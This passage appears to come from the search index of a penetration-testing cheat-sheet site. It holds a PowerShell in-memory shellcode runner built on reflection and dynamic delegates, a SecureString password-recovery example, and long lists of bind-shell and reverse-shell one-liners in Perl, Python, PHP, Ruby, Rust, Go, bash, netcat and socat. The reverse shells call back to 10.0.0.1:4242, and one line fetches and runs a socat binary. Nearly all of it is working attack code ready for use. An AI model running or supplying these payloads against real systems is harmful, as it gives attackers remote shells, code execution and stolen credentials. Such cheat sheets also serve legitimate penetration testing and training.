\n})\n\n$unsafeObj = $systemdll.GetType('Microsoft.Win32.UnsafeNativeMethods')\n</code></pre></p> <p>To retrieve the method <code>GetModuleHandle</code>, we can use the method <code>GetMethod(&lt;METHOD_NAME&gt;)</code> to retrieve it. <code>$GetModuleHandle = $unsafeObj.GetMethod('GetModuleHandle')</code></p> <p>Now we can use the <code>Invoke</code> method of our object <code>$GetModuleHandle</code> to get a reference of an unmanaged DLL. Invoke takes two arguments and both are objects:  * The first argument is the object to invoke it on but since we use it on a static method we may set it to \"$null\".  * The second argument is an array consisting of the arguments for the method we are invoking (GetModuleHandle). Since the Win32 API only takes the name of the DLL as a string we only need to supply that. <code>$GetModuleHandle.Invoke($null, @(\"user32.dll\"))</code></p> <p>However, we want to use the same method to use the function <code>GetProcAddress</code>, it won't work due to the fact that our <code>System.dll</code> object retrieved contains multiple occurences of the method <code>GetProcAddress</code>. Therefore the internal method <code>GetMethod()</code> will throw an error <code>\"Ambiguous match found.\"</code>.</p> <p>Therefore we will use the method <code>GetMethods()</code> to get all the available methods and then iterate over them to retrieve only those we want. <pre><code>$unsafeObj.GetMethods() | ForEach-Object {If($_.Name -eq \"GetProcAddress\") {$_}}\n</code></pre></p> <p>If we want to get the <code>GetProcAddress</code> reference, we will construct an array to store our matching object and use the first entry.</p> <pre><code>$unsafeObj.GetMethods() | ForEach-Object {If($_.Name -eq \"GetProcAddress\") {$tmp+=$_}}\n$GetProcAddress = $tmp[0]\n</code></pre> <p>We need to take the first one, because the arguments type of the second one does not match with ours.</p> <p>Alternatively we can use <code>GetMethod</code> function to precise the argument types that we want. <pre><code>$GetProcAddress = $unsafeObj.GetMethod('GetProcAddress',\n                 [reflection.bindingflags]'Public,Static', \n                 $null, \n                             [System.Reflection.CallingConventions]::Any,\n                             @([System.IntPtr], [string]), \n                             $null);\n</code></pre> cf: https://learn.microsoft.com/en-us/dotnet/api/system.type.getmethod?view=net-7.0</p> <p>Now we have everything to resolve any function address we want. <pre><code>$user32 = $GetModuleHandle.Invoke($null, @(\"user32.dll\"))\n$tmp=@()\n$unsafeObj.GetMethods() | ForEach-Object {If($_.Name -eq \"GetProcAddress\") {$tmp+=$_}}\n$GetProcAddress = $tmp[0]\n$GetProcAddress.Invoke($null, @($user32, \"MessageBoxA\"))\n</code></pre></p> <p>If we put everything in a function:  <pre><code>function LookupFunc {\n\n    Param ($moduleName, $functionName)\n\n    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')\n    $tmp=@()\n    $assem.GetMethods() | ForEach-Object {If($_.Name -eq \"GetProcAddress\") {$tmp+=$_}}\n    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))\n}\n</code></pre></p>"},{"location":"cheatsheets/powershell-cheatsheet/#delegatetype-reflection","title":"DelegateType Reflection","text":"<p>To be able to use the function that we have retrieved the address, we need to pair the information about the number of arguments and their associated data types with the resolved function memory address. This is done through <code>DelegateType</code>.  The DelegateType Reflection consists in manually create an assembly in memory and populate it with content.</p> <p>The first step is to create a new assembly with the class <code>AssemblyName</code> and assign it a name. <pre><code>$MyAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')\n</code></pre> Now we want to set permission on our Assembly. We need to set it to executable and to not be saved to the disk. For that the method <code>DefineDynamicAssembly</code> will be used. <pre><code>$Domain = [AppDomain]::CurrentDomain\n$MyAssemblyBuilder = $Domain.DefineDynamicAssembly($MyAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)\n</code></pre> Now that everything is set, we can start creating content inside our assembly. First, we will need to create the main building block which is a Module. This can be done through the method <code>DefineDynamicModule</code> The method need a custom name as the first argument and a boolean indicating if we want to include symbols or not. <pre><code>$MyModuleBuilder = $MyAssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)\n</code></pre> The next step consists by creating a custom type that will become our delegate type. It can be done with the method <code>DefineType</code>. The arguments are: * a custom name * the attributes of the type *  the type it build on top of <pre><code>$MyTypeBuilder = $MyModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])\n</code></pre> Then we will need to set the prototype of our function. First we need to use the method <code>DefineConstructor</code> to define a constructor. The method takes three arguments: * the attributes of the constructor * calling convention * the parameter types of the constructor that will become the function prototype <pre><code>$MyConstructorBuilder = $MyTypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public',\n                                                        [System.Reflection.CallingConventions]::Standard,\n                                                        @([IntPtr], [String], [String], [int]))\n</code></pre> Then we need to set some implementation flags with the method <code>SetImplementationFlags</code>. <pre><code>$MyConstructorBuilder.SetImplementationFlags('Runtime, Managed')\n</code></pre> To be able to call our function, we need to define the <code>Invoke</code> method in our delegate type. For that the method <code>DefineMethod</code> allows us to do that.  The method takes four arguments: * name of the method defined * method attributes  * return type * array of argument types <pre><code>$MyMethodBuilder = $MyTypeBuilder.DefineMethod('Invoke',\n                                                'Public, HideBySig, NewSlot, Virtual',\n                                                [int],\n                                                @([IntPtr], [String], [String], [int]))\n</code></pre> If we put everything in a function: <pre><code>function Get-Delegate\n{\n    Param (\n        [Parameter(Position = 0, Mandatory = $True)] [IntPtr] $funcAddr, # Function address\n        [Parameter(Position = 1, Mandatory = $True)] [Type[]] $argTypes, # array with the argument types\n        [Parameter(Position = 2)] [Type] $retType = [Void] # Return type\n    )\n\n    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('QD')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).\n    DefineDynamicModule('QM', $false).\n    DefineType('QT', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])\n    $type.DefineConstructor('RTSpecialName, HideBySig, Public',[System.Reflection.CallingConventions]::Standard, $argTypes).SetImplementationFlags('Runtime, Managed')\n    $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $retType, $argTypes).SetImplementationFlags('Runtime, Managed')\n    $delegate = $type.CreateType()\n\n    return [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($funcAddr, $delegate)\n}\n</code></pre></p>"},{"location":"cheatsheets/powershell-cheatsheet/#example-with-a-simple-shellcode-runner","title":"Example with a simple shellcode runner","text":"<pre><code># Create a Delegate function  to be able to call the function that we have the address\nfunction Get-Delegate\n{\n    Param (\n        [Parameter(Position = 0, Mandatory = $True)] [IntPtr] $funcAddr, # Function address\n        [Parameter(Position = 1, Mandatory = $True)] [Type[]] $argTypes, # array with the argument types\n        [Parameter(Position = 2)] [Type] $retType = [Void] # Return type\n    )\n\n    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('QD')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).\n    DefineDynamicModule('QM', $false).\n    DefineType('QT', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])\n    $type.DefineConstructor('RTSpecialName, HideBySig, Public',[System.Reflection.CallingConventions]::Standard, $argTypes).SetImplementationFlags('Runtime, Managed')\n    $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $retType, $argTypes).SetImplementationFlags('Runtime, Managed')\n    $delegate = $type.CreateType()\n\n    return [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($funcAddr, $delegate)\n}\n# Allow to retrieve function address from a dll\nfunction LookupFunc {\n\n    Param ($moduleName, $functionName)\n\n    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')\n    $tmp=@()\n    $assem.GetMethods() | ForEach-Object {If($_.Name -eq \"GetProcAddress\") {$tmp+=$_}}\n    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))\n}\n\n# Simple Shellcode runner using delegation\n$VirtualAllocAddr = LookupFunc \"Kernel32.dll\" \"VirtualAlloc\"\n$CreateThreadAddr = LookupFunc \"Kernel32.dll\" \"CreateThread\"\n$WaitForSingleObjectAddr = LookupFunc \"Kernel32.dll\" \"WaitForSingleObject\" \n\n\n$VirtualAlloc = Get-Delegate $VirtualAllocAddr @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])\n$CreateThread = Get-Delegate $CreateThreadAddr @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])\n$WaitForSingleObject = Get-Delegate $WaitForSingleObjectAddr @([IntPtr], [Int32]) ([Int])\n\n[Byte[]] $buf = 0xfc,0x48,0x83,0xe4,0xf0 ...\n\n$mem = $VirtualAlloc.Invoke([IntPtr]::Zero, $buf.Length, 0x3000, 0x40)\n[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $mem, $buf.Length)\n$hThread = $CreateThread.Invoke([IntPtr]::Zero, 0, $mem, [IntPtr]::Zero, 0, [IntPtr]::Zero)\n$WaitForSingleObject.Invoke($hThread, 0xFFFFFFFF)\n</code></pre>"},{"location":"cheatsheets/powershell-cheatsheet/#secure-string-to-plaintext","title":"Secure String to Plaintext","text":"<pre><code>$pass = \"01000000d08c9ddf0115d1118c7a00c04fc297eb01000000e4a07bc7aaeade47925c42c8be5870730000000002000000000003660000c000000010000000d792a6f34a55235c22da98b0c041ce7b0000000004800000a00000001000000065d20f0b4ba5367e53498f0209a3319420000000d4769a161c2794e19fcefff3e9c763bb3a8790deebf51fc51062843b5d52e40214000000ac62dab09371dc4dbfd763fea92b9d5444748692\" | convertto-securestring\n$user = \"HTB\\Tom\"\n$cred = New-Object System.management.Automation.PSCredential($user, $pass)\n$cred.GetNetworkCredential() | fl\nUserName       : Tom\nPassword       : 1ts-mag1c!!!\nSecurePassword : System.Security.SecureString\nDomain         : HTB\n</code></pre>"},{"location":"cheatsheets/powershell-cheatsheet/#references","title":"References","text":"<ul> <li>Windows &amp; Active Directory Exploitation Cheat Sheet and Command Reference - @chvancooten</li> <li>Basic PowerShell for Pentesters - HackTricks</li> </ul>"},{"location":"cheatsheets/shell-bind-cheatsheet/","title":"Bind Shell","text":""},{"location":"cheatsheets/shell-bind-cheatsheet/#summary","title":"Summary","text":"<ul> <li>Bind Shell<ul> <li>Perl</li> <li>Python</li> <li>PHP</li> <li>Ruby</li> <li>Netcat Traditional</li> <li>Netcat OpenBsd</li> <li>Ncat</li> <li>Socat</li> <li>Powershell</li> </ul> </li> </ul>"},{"location":"cheatsheets/shell-bind-cheatsheet/#perl","title":"Perl","text":"<pre><code>perl -e 'use Socket;$p=51337;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));\\\nbind(S,sockaddr_in($p, INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);\\\nclose C){open(STDIN,\"&gt;&amp;C\");open(STDOUT,\"&gt;&amp;C\");open(STDERR,\"&gt;&amp;C\");exec(\"/bin/bash -i\");};'\n</code></pre>"},{"location":"cheatsheets/shell-bind-cheatsheet/#python","title":"Python","text":"<p>Single line : <pre><code>python -c 'exec(\"\"\"import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind((\"0.0.0.0\",51337));s1.listen(1);c,a=s1.accept();\\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())\"\"\")'\n</code></pre></p> <p>Expanded version :</p> <pre><code>import socket as s,subprocess as sp;\n\ns1 = s.socket(s.AF_INET, s.SOCK_STREAM);\ns1.setsockopt(s.SOL_SOCKET, s.SO_REUSEADDR, 1);\ns1.bind((\"0.0.0.0\", 51337));\ns1.listen(1);\nc, a = s1.accept();\n\nwhile True: \n    d = c.recv(1024).decode();\n    p = sp.Popen(d, shell=True, stdout=sp.PIPE, stderr=sp.PIPE, stdin=sp.PIPE);\n    c.sendall(p.stdout.read()+p.stderr.read())\n</code></pre>"},{"location":"cheatsheets/shell-bind-cheatsheet/#php","title":"PHP","text":"<pre><code>php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,\"0.0.0.0\",51337);\\\nsocket_listen($s,1);$cl=socket_accept($s);while(1){if(!socket_write($cl,\"$ \",2))exit;\\\n$in=socket_read($cl,100);$cmd=popen(\"$in\",\"r\");while(!feof($cmd)){$m=fgetc($cmd);\\\n    socket_write($cl,$m,strlen($m));}}'\n</code></pre>"},{"location":"cheatsheets/shell-bind-cheatsheet/#ruby","title":"Ruby","text":"<pre><code>ruby -rsocket -e 'f=TCPServer.new(51337);s=f.accept;exec sprintf(\"/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d\",s,s,s)'\n</code></pre>"},{"location":"cheatsheets/shell-bind-cheatsheet/#netcat-traditional","title":"Netcat Traditional","text":"<pre><code>nc -nlvp 51337 -e /bin/bash\n</code></pre>"},{"location":"cheatsheets/shell-bind-cheatsheet/#netcat-openbsd","title":"Netcat OpenBsd","text":"<pre><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc -lvp 51337 &gt;/tmp/f\n</code></pre>"},{"location":"cheatsheets/shell-bind-cheatsheet/#socat","title":"Socat","text":"<pre><code>user@attacker$ socat FILE:`tty`,raw,echo=0 TCP:target.com:12345 \nuser@victim$ socat TCP-LISTEN:12345,reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane\n</code></pre>"},{"location":"cheatsheets/shell-bind-cheatsheet/#powershell","title":"Powershell","text":"<pre><code>https://github.com/besimorhino/powercat\n\n# Victim (listen)\n. .\\powercat.ps1\npowercat -l -p 7002 -ep\n\n# Connect from attacker\n. .\\powercat.ps1\npowercat -c 127.0.0.1 -p 7002\n</code></pre>"},{"location":"cheatsheets/shell-reverse-cheatsheet/","title":"Reverse Shell Cheat Sheet","text":""},{"location":"cheatsheets/shell-reverse-cheatsheet/#summary","title":"Summary","text":"<ul> <li>Tools</li> <li>Reverse Shell<ul> <li>Awk</li> <li>Automatic Reverse Shell Generator</li> <li>Bash TCP</li> <li>Bash UDP</li> <li>C</li> <li>Dart</li> <li>Golang</li> <li>Groovy Alternative 1</li> <li>Groovy</li> <li>Java Alternative 1</li> <li>Java Alternative 2</li> <li>Java</li> <li>Lua</li> <li>Ncat</li> <li>Netcat OpenBsd</li> <li>Netcat BusyBox</li> <li>Netcat Traditional</li> <li>NodeJS</li> <li>OGNL</li> <li>OpenSSL</li> <li>Perl</li> <li>PHP</li> <li>Powershell</li> <li>Python</li> <li>Ruby</li> <li>Rust</li> <li>Socat</li> <li>Telnet</li> <li>War</li> </ul> </li> <li>Meterpreter Shell<ul> <li>Windows Staged reverse TCP</li> <li>Windows Stageless reverse TCP</li> <li>Linux Staged reverse TCP</li> <li>Linux Stageless reverse TCP</li> <li>Other platforms</li> </ul> </li> <li>Spawn TTY Shell</li> <li>References</li> </ul>"},{"location":"cheatsheets/shell-reverse-cheatsheet/#tools","title":"Tools","text":"<ul> <li>reverse-shell-generator - Hosted Reverse Shell generator (source) </li> <li>revshellgen -  CLI Reverse Shell generator</li> </ul>"},{"location":"cheatsheets/shell-reverse-cheatsheet/#reverse-shell","title":"Reverse Shell","text":""},{"location":"cheatsheets/shell-reverse-cheatsheet/#bash-tcp","title":"Bash TCP","text":"<pre><code>bash -i &gt;&amp; /dev/tcp/10.0.0.1/4242 0&gt;&amp;1\n\n0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/10.0.0.1/4242; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196\n\n/bin/bash -l &gt; /dev/tcp/10.0.0.1/4242 0&lt;&amp;1 2&gt;&amp;1\n</code></pre>"},{"location":"cheatsheets/shell-reverse-cheatsheet/#bash-udp","title":"Bash UDP","text":"<pre><code>Victim:\nsh -i &gt;&amp; /dev/udp/10.0.0.1/4242 0&gt;&amp;1\n\nListener:\nnc -u -lvp 4242\n</code></pre> <p>Don't forget to check with others shell : sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, bash</p>"},{"location":"cheatsheets/shell-reverse-cheatsheet/#socat","title":"Socat","text":"<p><pre><code>user@attack$ socat file:`tty`,raw,echo=0 TCP-L:4242\nuser@victim$ /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4242\n</code></pre> <pre><code>user@victim$ wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4242\n</code></pre></p> <p>Static socat binary can be found at https://github.com/andrew-d/static-binaries</p>"},{"location":"cheatsheets/shell-reverse-cheatsheet/#perl","title":"Perl","text":"<pre><code>perl -e 'use Socket;$i=\"10.0.0.1\";$p=4242;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\"&gt;&amp;S\");open(STDOUT,\"&gt;&amp;S\");open(STDERR,\"&gt;&amp;S\");exec(\"/bin/sh -i\");};'\n\nperl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"10.0.0.1:4242\");STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'\n\n\nNOTE: Windows only\nperl -MIO -e '$c=new IO::Socket::INET(PeerAddr,\"10.0.0.1:4242\");STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'\n</code></pre>"},{"location":"cheatsheets/shell-reverse-cheatsheet/#python","title":"Python","text":"<p>Linux only</p> <p>IPv4 <pre><code>export RHOST=\"10.0.0.1\";export RPORT=4242;python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'\n</code></pre> <pre><code>python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'\n</code></pre> <pre><code>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'\n</code></pre> <pre><code>python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4242));subprocess.call([\"/bin/sh\",\"-i\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'\n</code></pre></p> <p>IPv4 (No Spaces) <pre><code>python -c 'socket=__import__(\"socket\");os=__import__(\"os\");pty=__import__(\"pty\");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'\n</code></pre> <pre><code>python -c 'socket=__import__(\"socket\");subprocess=__import__(\"subprocess\");os=__import__(\"os\");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'\n</code></pre> <pre><code>python -c 'socket=__import__(\"socket\");subprocess=__import__(\"subprocess\");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4242));subprocess.call([\"/bin/sh\",\"-i\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'\n</code></pre></p> <p>IPv4 (No Spaces, Shortened) <pre><code>python -c 'a=__import__;s=a(\"socket\");o=a(\"os\").dup2;p=a(\"pty\").spawn;c=s.socket(s.AF_INET,s.SOCK_STREAM);c.connect((\"10.0.0.1\",4242));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p(\"/bin/sh\")'\n</code></pre> <pre><code>python -c 'a=__import__;b=a(\"socket\");p=a(\"subprocess\").call;o=a(\"os\").dup2;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect((\"10.0.0.1\",4242));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p([\"/bin/sh\",\"-i\"])'\n</code></pre> <pre><code>python -c 'a=__import__;b=a(\"socket\");c=a(\"subprocess\").call;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect((\"10.0.0.1\",4242));f=s.fileno;c([\"/bin/sh\",\"-i\"],stdin=f(),stdout=f(),stderr=f())'\n</code></pre></p> <p>IPv4 (No Spaces, Shortened Further) <pre><code>python -c 'a=__import__;s=a(\"socket\").socket;o=a(\"os\").dup2;p=a(\"pty\").spawn;c=s();c.connect((\"10.0.0.1\",4242));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p(\"/bin/sh\")'\n</code></pre> <pre><code>python -c 'a=__import__;b=a(\"socket\").socket;p=a(\"subprocess\").call;o=a(\"os\").dup2;s=b();s.connect((\"10.0.0.1\",4242));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p([\"/bin/sh\",\"-i\"])'\n</code></pre> <pre><code>python -c 'a=__import__;b=a(\"socket\").socket;c=a(\"subprocess\").call;s=b();s.connect((\"10.0.0.1\",4242));f=s.fileno;c([\"/bin/sh\",\"-i\"],stdin=f(),stdout=f(),stderr=f())'\n</code></pre></p> <p>IPv6 <pre><code>python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect((\"dead:beef:2::125c\",4242,0,2));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'\n</code></pre></p> <p>IPv6 (No Spaces) <pre><code>python -c 'socket=__import__(\"socket\");os=__import__(\"os\");pty=__import__(\"pty\");s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect((\"dead:beef:2::125c\",4242,0,2));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'\n</code></pre></p> <p>IPv6 (No Spaces, Shortened) <pre><code>python -c 'a=__import__;c=a(\"socket\");o=a(\"os\").dup2;p=a(\"pty\").spawn;s=c.socket(c.AF_INET6,c.SOCK_STREAM);s.connect((\"dead:beef:2::125c\",4242,0,2));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p(\"/bin/sh\")'\n</code></pre></p> <p>Windows only (Python2)</p> <pre><code>python.exe -c \"(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.0.0.1', 4242)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\\\windows\\\\system32\\\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) &gt; 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))\"\n</code></pre> <p>Windows only (Python3)</p> <pre><code>python.exe -c \"import socket,os,threading,subprocess as sp;p=sp.Popen(['cmd.exe'],stdin=sp.PIPE,stdout=sp.PIPE,stderr=sp.STDOUT);s=socket.socket();s.connect(('10.0.0.1',4242));threading.Thread(target=exec,args=(\\\"while(True):o=os.read(p.stdout.fileno(),1024);s.send(o)\\\",globals()),daemon=True).start();threading.Thread(target=exec,args=(\\\"while(True):i=s.recv(1024);os.write(p.stdin.fileno(),i)\\\",globals())).start()\"\n</code></pre>"},{"location":"cheatsheets/shell-reverse-cheatsheet/#php","title":"PHP","text":"<pre><code>php -r '$sock=fsockopen(\"10.0.0.1\",4242);exec(\"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\");'\nphp -r '$sock=fsockopen(\"10.0.0.1\",4242);shell_exec(\"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\");'\nphp -r '$sock=fsockopen(\"10.0.0.1\",4242);`/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3`;'\nphp -r '$sock=fsockopen(\"10.0.0.1\",4242);system(\"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\");'\nphp -r '$sock=fsockopen(\"10.0.0.1\",4242);passthru(\"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\");'\nphp -r '$sock=fsockopen(\"10.0.0.1\",4242);popen(\"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\", \"r\");'\n</code></pre> <pre><code>php -r '$sock=fsockopen(\"10.0.0.1\",4242);$proc=proc_open(\"/bin/sh -i\", array(0=&gt;$sock, 1=&gt;$sock, 2=&gt;$sock),$pipes);'\n</code></pre>"},{"location":"cheatsheets/shell-reverse-cheatsheet/#ruby","title":"Ruby","text":"<pre><code>ruby -rsocket -e'f=TCPSocket.open(\"10.0.0.1\",4242).to_i;exec sprintf(\"/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d\",f,f,f)'\n\nruby -rsocket -e'exit if fork;c=TCPSocket.new(\"10.0.0.1\",\"4242\");loop{c.gets.chomp!;(exit! if $_==\"exit\");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts \"failed: #{$_}\"}'\n\nNOTE: Windows only\nruby -rsocket -e 'c=TCPSocket.new(\"10.0.0.1\",\"4242\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'\n</code></pre>"},{"location":"cheatsheets/shell-reverse-cheatsheet/#rust","title":"Rust","text":"<pre><code>use std::net::TcpStream;\nuse std::os::unix::io::{AsRawFd, FromRawFd};\nuse std::process::{Command, Stdio};\n\nfn main() {\n    let s = TcpStream::connect(\"10.0.0.1:4242\").unwrap();\n    let fd = s.as_raw_fd();\n    Command::new(\"/bin/sh\")\n        .arg(\"-i\")\n        .stdin(unsafe { Stdio::from_raw_fd(fd) })\n        .stdout(unsafe { Stdio::from_raw_fd(fd) })\n        .stderr(unsafe { Stdio::from_raw_fd(fd) })\n        .spawn()\n        .unwrap()\n        .wait()\n        .unwrap();\n}\n</code></pre>"},{"location":"cheatsheets/shell-reverse-cheatsheet/#golang","title":"Golang","text":"<pre><code>echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"10.0.0.1:4242\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' &gt; /tmp/t.go &amp;&amp; go run /tmp/t.go &amp;&amp; rm /tmp/t.go\n</code></pre>"},{"location":"cheatsheets/shell-reverse-cheatsheet/#netcat-traditional","title":"Netcat Traditional","text":"<pre><code>nc -e /bin/sh 10.0.0.1 4242\nnc -e /bin/bash 10.0.0.1 4242\nnc -c bash 10.0.0.1 4242\n</code></pre>"},{"location":"cheatsheets/shell-reverse-cheatsheet/#netcat-openbsd","title":"Netcat OpenBsd","text":"<pre><code>rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 4242 &gt;/tmp/f\n</code></pre>"},{"location":"cheatsheets/shell-reverse-cheatsheet/#netcat-busybox","title":"Netcat BusyBox","text":"<pre><code>rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 4242 &gt;/tmp/f\n</code></pre>"},{"location":"cheatsheets/shell-reverse-cheatsheet/#ncat","title":"Ncat","text":"<pre><code>ncat 